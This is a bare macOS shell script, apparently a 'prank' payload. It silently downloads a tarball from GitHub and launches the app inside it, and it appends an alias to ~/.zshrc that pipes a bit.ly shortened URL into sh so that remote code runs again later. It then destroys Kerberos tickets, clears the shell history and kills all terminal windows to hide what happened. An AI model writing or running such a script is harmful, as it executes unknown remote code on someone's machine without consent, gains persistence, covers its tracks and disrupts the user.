mkdir -p /tmp/spoody/

curl -s -L https://github.com/mehdibo/golden-cable/blob/master/pranky-darwin-x64.tar.gz?raw=true -o /tmp/spoody/pranky.tar.gz > /dev/null

tar -xvf /tmp/spoody/pranky.tar.gz -C /tmp/spoody > /dev/null

nohup open /tmp/spoody/app/Pranky.app > /dev/null

if [ `alias | grep spoody | wc -l` -eq 0 ]; then
  echo "alias spoody='curl -s -L bit.ly/spody | sh'" >> ~/.zshrc
fi

kdestroy
clear
history -c

killall iTerm
killall Terminal
killall iTerm2
